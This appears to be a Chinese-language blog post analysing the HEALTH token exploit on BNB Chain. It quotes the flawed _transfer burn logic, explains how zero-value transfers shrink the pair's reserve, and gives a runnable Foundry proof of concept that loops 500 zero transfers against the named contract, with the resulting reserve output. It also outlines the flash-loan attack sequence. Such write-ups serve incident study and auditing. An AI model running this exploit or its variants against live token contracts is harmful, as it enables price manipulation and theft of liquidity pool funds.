# HealthToken 攻击案例分析


HEALTH Token 攻击案例分析

<!--more-->

## 漏洞分析

攻击 tx: https://bscscan.com/tx/0xae8ca9dc8258ae32899fe641985739c3fa53ab1f603973ac74b424e165c66ccf

被攻击合约: [0x32B166e082993Af6598a89397E82e123ca44e74E](https://bscscan.com/address/0x32B166e082993Af6598a89397E82e123ca44e74E) 

合约中的`_transfer`函数如下:

```solidity
    function _transfer(address from, address to, uint256 value) private {
        require(value <= _balances[from]);
        require(to != address(0));
        
        uint256 contractTokenBalance = balanceOf(address(this));

        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            to == uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            contractTokenBalance = numTokensSellToAddToLiquidity;
            //add liquidity
            swapAndLiquify(contractTokenBalance);
        }
        if (block.timestamp >= pairStartTime.add(jgTime) && pairStartTime != 0) {
            if (from != uniswapV2Pair) {
                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);
                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);
                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);
                if (block.timestamp >= pairStartTime.add(jgTime)) {
                    pairStartTime += jgTime;
                }
                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);
                IPancakePair(uniswapV2Pair).sync();
            }
        }
        uint256 devValue = value.mul(devFee).div(1000);
        uint256 bValue = value.mul(bFee).div(1000);
        uint256 newValue = value.sub(devValue).sub(bValue);
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(newValue);
        _balances[address(this)] = _balances[address(this)].add(devValue);
        _balances[_burnAddress] = _balances[_burnAddress].add(bValue);
        
        emit Transfer(from,to, newValue);
        emit Transfer(from,address(this), devValue);
        emit Transfer(from,_burnAddress, bValue);
    }
```

其中有一段逻辑是: 每进行一笔转账,就会销毁掉一部分token, 也就是将uniswapV2Pair的余额减去一部分,将_burnAddress的余额增加一部分.

```solidity
            if (from != uniswapV2Pair) {
                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);
                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);
                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);
                if (block.timestamp >= pairStartTime.add(jgTime)) {
                    pairStartTime += jgTime;
                }
                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);
                IPancakePair(uniswapV2Pair).sync();
            }
```

但是销毁的量并没有依据transfer时的value进行计算, 而是根据`_balances[uniswapV2Pair].mul(burnFee).div(1000)`进行计算的, 假如`burnFee`是`1`, 那么任意数量的转账都会销毁uniswapV2Pair余额的千分之一, 哪怕转账数量是0.

这就导致了一个严重的bug: 重复进行`value`为0的转账, 用户手中的币并不会减少, 但`uniswapV2Pair`的余额却在不断减少, 这就导致了 pair 中 token0 (WBNB) 与 token1(HEALTH token)的比率不断变化, 也就是相比于WBNB, HEALTH token的价格越来越高. 这就形成了价格操纵.



## POC

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function balanceOf(address owner) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);
}

interface IPancakePair {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

IERC20 constant HealthToken = IERC20(
    0x32B166e082993Af6598a89397E82e123ca44e74E
);

IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

IPancakePair constant pancakePair = IPancakePair(
    0xF375709DbdE84D800642168c2e8bA751368e8D32
);

contract Hack is Test {
    function setUp() public {
        vm.createSelectFork("theNet", 22337400); //bsc
    }

    function testPoc() public {
        console2.log("token0 is:", IERC20(pancakePair.token0()).symbol());
        console2.log("token1 is:", IERC20(pancakePair.token1()).symbol());

        (uint112 token0, uint112 token1, ) = pancakePair.getReserves();
        emit log_named_decimal_uint(
            "[before]token0",
            token0,
            IERC20(pancakePair.token0()).decimals()
        );
        emit log_named_decimal_uint(
            "[before]token1",
            token1,
            IERC20(pancakePair.token1()).decimals()
        );

        // 连续0转账500次
        for (uint i = 0; i < 500; i++) {
            HealthToken.transfer(address(this), 0);
        }

        (token0, token1, ) = pancakePair.getReserves();
        emit log_named_decimal_uint(
            "[after]token0 ",
            token0,
            IERC20(pancakePair.token0()).decimals()
        );
        emit log_named_decimal_uint(
            "[after]token1 ",
            token1,
            IERC20(pancakePair.token1()).decimals()
        );
    }
}

```

输出:

```sh
[PASS] testPoc() (gas: 11524943)
Logs:
  token0 is: HEALTH
  token1 is: WBNB
  [before]token0: 62563539.073327292627431307
  [before]token1: 38.502835300011026965
  [after]token0 : 37937212.810065723981756912
  [after]token1 : 38.502835300011026965
```

以循环500次为例, pair中的HEALTH token数量减少了接近一半, 也就是价格涨了接近一半.

在实际攻击中, 攻击者先利用闪电贷贷款了WBNB, 然后用WBNB swap了一些 HEALTH, 然后操作价格, 再高价将手中的HEALTH通过swap卖出而获利.


